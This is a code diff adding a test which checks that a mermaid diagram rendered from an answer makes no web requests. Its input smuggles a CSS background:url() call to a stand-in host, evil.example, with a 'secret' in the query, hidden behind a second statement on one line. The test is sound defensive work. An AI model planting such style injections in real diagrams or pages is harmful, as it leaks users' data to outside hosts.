@@ -46,3 +46,10 @@ test('a classDef in an answer diagram points at nothing on the web', async () =>
   expect(html).toContain('<svg')
   expect(html).not.toMatch(WEB_URL)
 })
+
+test('a style statement after another on the same line points at nothing on the web', async () => {
+  const html = await drawnAnswer(
+    '```mermaid\nflowchart TD\n  A-->B; style A background:url(https://evil.example/same?secret=42)\n```',
+  )
+  expect(html).not.toMatch(/evil\.example/)
+})
